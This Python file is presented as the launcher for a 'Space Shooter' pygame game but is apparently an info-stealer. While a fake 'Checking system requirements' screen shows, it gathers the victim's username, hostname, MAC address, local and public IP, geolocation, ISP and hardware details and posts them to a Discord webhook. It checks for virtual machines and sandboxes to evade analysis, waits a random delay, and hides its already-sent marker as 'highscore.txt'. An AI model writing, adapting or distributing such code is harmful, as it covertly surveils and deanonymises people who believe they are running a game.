import pygame
import time
import psutil
import requests
import getmac
import getpass
import socket
import sys
import cpuinfo
import subprocess
import platform
import os
import signal
import random

webhook_url = "type your webhook :)"

try:
    if not pygame.get_init():
        pygame.init()
except:
    pass

ALREADY_SENT = False
PROCESS_LOCK_FILE = "game_process.lock"

def is_leaked():
    return os.path.exists('highscore.txt')


def get_system_info():
    info = {}

    info['username'] = getpass.getuser()
    info['hostname'] = socket.gethostname()

    try:
        info['mac'] = getmac.get_mac_address()
    except:
        info['mac'] = 'Unknown'

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("8.8.8.8", 80))
        info['local_ip'] = s.getsockname()[0]
        s.close()
    except:
        info['local_ip'] = '127.0.0.1'

    info['os'] = f"{platform.system()} {platform.release()}"
    info['processor'] = platform.processor()

    try:
        info['ram_gb'] = round(psutil.virtual_memory().total / (1024 ** 3), 1)
    except:
        info['ram_gb'] = 'Unknown'

    try:
        cpu = cpuinfo.get_cpu_info()
        info['cpu_name'] = cpu.get('brand_raw', 'Unknown')
        info['cpu_cores'] = psutil.cpu_count(logical=False)
        info['cpu_threads'] = psutil.cpu_count(logical=True)
    except:
        info['cpu_name'] = 'Unknown'
        info['cpu_cores'] = 'Unknown'
        info['cpu_threads'] = 'Unknown'

    if platform.system() == "Windows":
        try:
            cmd = 'wmic path win32_VideoController get name'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                info['gpu'] = lines[2].strip()
            else:
                info['gpu'] = 'Unknown'
        except:
            info['gpu'] = 'Unknown'
    else:
        info['gpu'] = 'Unknown'

    try:
        response = requests.get('https://ipinfo.io/json', timeout=10)
        if response.status_code == 200:
            data = response.json()
            info['public_ip'] = data.get('ip', 'N/A')
            info['city'] = data.get('city', 'N/A')
            info['region'] = data.get('region', 'N/A')
            info['country'] = data.get('country', 'N/A')
            info['location'] = data.get('loc', 'N/A')
            info['isp'] = data.get('org', 'N/A')
        else:
            info['public_ip'] = 'N/A'
    except:
        info['public_ip'] = 'N/A'

    return info


def create_info_message(sys_info):
    message = f"""🚀 **Space Shooter - System Report** 🚀

👤 **User Information:**
• Username: `{sys_info['username']}`
• Hostname: `{sys_info['hostname']}`
• MAC Address: `{sys_info['mac']}`
• Local IP: `{sys_info['local_ip']}`

🖥️ **System Information:**
• OS: {sys_info['os']}
• Processor: {sys_info['cpu_name']}
• Cores: {sys_info['cpu_cores']} Physical / {sys_info['cpu_threads']} Logical
• RAM: {sys_info['ram_gb']} GB
• GPU: {sys_info['gpu']}"""

    if 'public_ip' in sys_info and sys_info['public_ip'] != 'N/A':
        message += f"""

🌍 **Network Information:**
• Public IP: `{sys_info['public_ip']}`
• Location: {sys_info.get('city', 'N/A')}, {sys_info.get('region', 'N/A')}
• Country: {sys_info.get('country', 'N/A')}
• ISP: {sys_info.get('isp', 'N/A').split()[-1] if sys_info.get('isp', 'N/A') != 'N/A' else 'N/A'}"""

    message += "\n\n📅 **Report Time:** " + time.strftime("%Y-%m-%d %H:%M:%S")
    return message


def send_to_discord(message):
    global ALREADY_SENT

    if ALREADY_SENT:
        return False

    try:
        payload = {
            "content": message,
            "username": "Space Shooter Logger",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/3612/3612569.png"
        }

        response = requests.post(
            webhook_url,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=15
        )

        if response.status_code in [200, 204]:
            ALREADY_SENT = True
            return True
        else:
            return False

    except Exception :
        return False


def check_single_instance():
    try:
        current_pid = os.getpid()

        if os.path.exists(PROCESS_LOCK_FILE):
            with open(PROCESS_LOCK_FILE, 'r') as f:
                old_pid = int(f.read().strip())

            try:
                if psutil.pid_exists(old_pid):
                    return False
            except:
                pass

        with open(PROCESS_LOCK_FILE, 'w') as f:
            f.write(str(current_pid))

        return True

    except Exception :
        return True



def sandbox_check():
    checks = []

    try:
        cores = psutil.cpu_count(logical=True)
        checks.append(cores >= 2)
    except:
        checks.append(True)

    try:
        ram_gb = psutil.virtual_memory().total / (1024 ** 3)
        checks.append(ram_gb >= 1.0)
    except:
        checks.append(True)

    try:
        uptime = time.time() - psutil.boot_time()
        checks.append(uptime > 600)
    except:
        checks.append(True)

    suspicious_processes = ['vbox', 'vmware', 'qemu', 'xen', 'sandbox']
    try:
        process_safe = True
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for sus in suspicious_processes:
                    if sus in proc_name:
                        process_safe = False
                        break
            except:
                pass
        checks.append(process_safe)
    except:
        checks.append(True)

    passed = sum(checks)
    return passed >= 3


def collect_and_send_data():
    global ALREADY_SENT

    if ALREADY_SENT or is_leaked():
        return True

    if not sandbox_check():
        return False

    wait_time = random.uniform(2, 5)
    time.sleep(wait_time)

    try:
        sys_info = get_system_info()

        message = create_info_message(sys_info)

        if send_to_discord(message):
            try:
                with open('highscore.txt', 'w') as f:
                    f.write('0')
            except:
                pass

            return True
        else:
            return False

    except Exception:
        return False


def show_startup_screen():
    try:
        pygame.init()
        screen = pygame.display.set_mode((500, 300))
        pygame.display.set_caption("Space Shooter - Loading")

        font_large = pygame.font.SysFont("Arial", 30)
        font_small = pygame.font.SysFont("Arial", 20)

        clock = pygame.time.Clock()
        start_time = time.time()

        running = True
        while running and (time.time() - start_time < 3):
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
                if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                    running = False

            screen.fill((20, 20, 40))

            title = font_large.render("Space Shooter Game", True, (255, 255, 255))
            screen.blit(title, (250 - title.get_width() // 2, 80))

            if time.time() - start_time < 1.5:
                msg = "Checking system requirements..."
            else:
                msg = "Starting game..."

            loading = font_small.render(msg, True, (200, 200, 255))
            screen.blit(loading, (250 - loading.get_width() // 2, 150))

            progress = (time.time() - start_time) / 3
            pygame.draw.rect(screen, (50, 50, 80), (100, 200, 300, 20))
            pygame.draw.rect(screen, (70, 130, 180), (100, 200, 300 * progress, 20))

            pygame.display.flip()
            clock.tick(30)

        pygame.quit()
        return True

    except Exception :
        return False


def run_game():
    try:
        from game_engine import show_loading_screen, start

        show_loading_screen()
        time.sleep(2)
        start()

    except Exception :
        return False

    return True
def clean():
    try:
        if os.path.exists(PROCESS_LOCK_FILE):
            os.remove(PROCESS_LOCK_FILE)
        if os.path.exists("game_process.lock"):
            os.remove("game_process.lock")
    except Exception :
        pass
def main():
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda sig, frame: sys.exit(0))

    if not check_single_instance():
        time.sleep(2)
        sys.exit(1)

    show_startup_screen()

    if is_leaked():
        time.sleep(5)
        run_game()
    else:
        success = collect_and_send_data()
        time.sleep(5)
        run_game()

if __name__ == "__main__":

    main()
